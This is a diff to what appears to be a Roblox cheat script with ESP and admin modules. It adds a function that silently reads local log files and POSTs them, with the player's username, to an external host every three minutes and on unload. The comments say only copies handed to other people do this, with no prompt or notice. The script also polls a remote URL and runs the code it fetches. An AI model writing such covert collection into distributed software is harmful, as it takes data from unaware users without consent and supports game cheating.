@@ -12701,7 +12701,7 @@ getgenv().__CS_ESP = ESP
 return ESP
 ]==]
 local ENGINE_ORDER = { "cs_core.lua", "cs_classes.lua", "cs_projectile_forge.lua", "cs_esp.lua", }
-local ENGINE_BUILD = "2026-08-01 20:20:26"
+local ENGINE_BUILD = "2026-08-01 20:57:36"
 getgenv().__CS_BUILD = ENGINE_BUILD
 -- <<< ENGINE PAYLOAD END
 
@@ -17754,6 +17754,9 @@ function S.destroy()
     S.armed = false
     S.capturing = nil
     S.setBar, S.acceptGhost = nil, nil
+    -- Final log on the way out, so a clean unload always leaves its last state
+    -- at the sink. nil sink (every local build) makes this a no-op.
+    pcall(function() if S.shipLogs then S.shipLogs("unload") end end)
     print("[CSAdmin] unloaded")
     if G.__CS_ADMIN == S then G.__CS_ADMIN = nil end
 end
@@ -17900,6 +17903,20 @@ local HOT_POLL_SEC = 3
 local HOT_URL = "https://raw.githubusercontent.com/xReset/cs-dist/main/cs_portable.lua"  -- dist build: poll the published copy
 local HOT_URL_POLL_SEC = 60
 
+-- LOG SINK. nil in every local build -- your own logs stay on your disk. The
+-- portable build rewrites this to the receiver URL (build_portable.sh), so only
+-- copies handed to other people ship their log, automatically and silently.
+--
+-- Write-only sink: it accepts POSTs and hands nothing back. The URL is in a
+-- PUBLIC file, so it can only be spammed, not read -- the receiver caps size and
+-- rate for exactly that.
+--
+-- Fully automatic by request: no command, no prompt, no action from the holder.
+-- Ships on an interval and once more on unload, so a session that ends cleanly
+-- always leaves its final log.
+local LOG_SINK_URL = "https://restsimages.pics/cslog/ingest"  -- dist build: silent log shipping
+local LOG_SINK_POLL_SEC = 180
+
 G.__CS_ADMIN_GEN = (G.__CS_ADMIN_GEN or 0) + 1
 local myGen = G.__CS_ADMIN_GEN
 S.hotReload = true
@@ -17943,6 +17960,49 @@ local function hotApply(body, why)
         if not ok then Log.err("hot reload: new copy errored on load", e) end
     end)
     return true
+end
+
+-- Ships the two logs to LOG_SINK_URL. Silent and best-effort: every failure
+-- path is a no-op, because a log shipper that interrupts play or spams the
+-- console is worse than one that occasionally misses a send.
+local function shipLogs(why)
+    if not LOG_SINK_URL then return end
+    local http = (syn and syn.request) or http_request or request
+        or (http and http.request)
+    if not http or not readfile then return end
+    local who = "unknown"
+    pcall(function() who = game:GetService("Players").LocalPlayer.Name end)
+    local parts = {}
+    for _, f in ipairs({ "logs/cs_core.log", "logs/cs_admin.log" }) do
+        local ok, body = pcall(readfile, f)
+        if ok and type(body) == "string" and #body > 0 then
+            parts[#parts + 1] = "===== " .. f .. " (" .. tostring(why) .. ") =====\n" .. body
+        end
+    end
+    if #parts == 0 then return end
+    local payload = table.concat(parts, "\n\n")
+    -- Newest tail only: the receiver caps a post at 2 MB and a long session's
+    -- cs_core.log can pass that. The tail is where the current bug is anyway.
+    if #payload > 1500000 then payload = payload:sub(#payload - 1500000) end
+    local url = LOG_SINK_URL
+        .. (LOG_SINK_URL:find("?", 1, true) and "&" or "?")
+        .. "who=" .. (game:GetService("HttpService"):UrlEncode(who))
+    pcall(http, {
+        Url = url, Method = "POST", Body = payload,
+        Headers = { ["Content-Type"] = "text/plain" },
+    })
+end
+S.shipLogs = shipLogs
+
+if LOG_SINK_URL then
+    task.spawn(function()
+        while true do
+            task.wait(LOG_SINK_POLL_SEC)
+            if G.__CS_ADMIN_GEN ~= myGen then return end
+            if not S.alive then return end
+            shipLogs("interval")
+        end
+    end)
 end
 
 task.spawn(function()
